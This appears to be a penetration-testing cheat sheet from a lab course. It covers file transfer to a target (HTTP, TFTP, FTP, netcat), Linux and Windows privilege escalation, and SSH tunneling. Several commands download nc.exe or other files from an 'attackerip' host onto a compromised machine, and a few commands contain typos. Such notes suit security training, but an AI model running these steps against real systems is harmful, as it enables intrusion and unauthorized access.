## File transfers

### HTTP

Create a webserver on the attacking machine:

Directory: /var/www/html

Ensure server is running: ```systemctl start Apache2```

Alternatively, you can create a server in the current directory with:

```Python -m SimpleHTTPServer 80```

Pull files on target machine: ```wget http://attackerip/file```

Or: ```curl http://attackerip/file > file``` 

Ensure server is running: ```systemctl start Apache2```

### TFTP 

   Attacking machine:

  ```Mkdir/tftp```

  ```atftpd –daemon –port 69 /tftp```

  ```cp /usr/share/windows-binaries/nc.exe.tftp/```

   Target
    
```tftp -i 10.11.0.5 get nc.exe```

### FTP

   Create an FTP server in the directory you are in, on port 21, allow anonymous access:
   
   ```Python -m pyftpdlib -p 21 -w```
   
   Can be made non-interactive by providing the ftp.exe with a text file containing the commands to be executed

   Use the following via remote shell to download

  ```Echo open 10.11.0.5 21 >> ftp.txt```

  ```Echo USER offsec>> ftp.txt```

  ```Echo ftp>> ftp.txt```

  ```Echo bin>> ftp.txt```

  ```Echo GET nc.exe >> ftp.txt```

  ```Echo bye >> ftp.txt```

  ```ftp -v -n -s:ftp.txt```
  
  ### Netcat

   On server machine: ```nc -nlvp 4444 > incoming.exe```

   On client machine: ```nc – nv 10.11.23.33 4444 < incoming.exe```
   
## Privilege escalation

  Linux example: CVE 2012-0056

  Windows example: MS11-080
  
### Linux

Use any passwords found to attempt to become root by using: ```sudo su```

If not, try ```sudo -l```

Look for available kernel exploits by enumerating Linux version info:

```uname -ar```
```cat /etc/issue```
```cat /etc/*-release```
```cat /etc/lsb-release``` Debian-based machines
```cat /etc/redhat-release``` Redhat-based machines

Refer to gotmilk's article:  https://blog.g0tmi1k,com/2011/08/basic-linum-privilege-escalation/

### Windows

Look for know exploits in current Windows versions

```systeminfo | findstr /B/C:"OS Name" /C:"OS Version"```

Refer to absolomb's article:  https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

#### XP/2003

Look for programs in the dock running as SYSTEM 

Click to open file dialogue.  Find cmd.exe and open; you'll get a cmd prompt as SYSTEM.

Shatter attacks.  (research and fill in)

#### Windows 7

Incorrect permission, i.e. programs giving full write privileges to all users.  You can then modify files in the directory to execute malicious code.

## Tunneling

### SSH tunneling 

   Local port forwarding 

```ssh <gateway> -L <local port to listen>:<remote host>:<remote port>```

   Remote port forwarding

```ssh <gateway> -R <remote port to bind>:<local host>:<local port>```

   Dynamic port forwarding 

```ssh -D <local proxy port> -p <remote port> <target>```

   HTTP tunneling – technique to encapsulate a protocol within HTTP

      HTTPTunnel or stunnel 

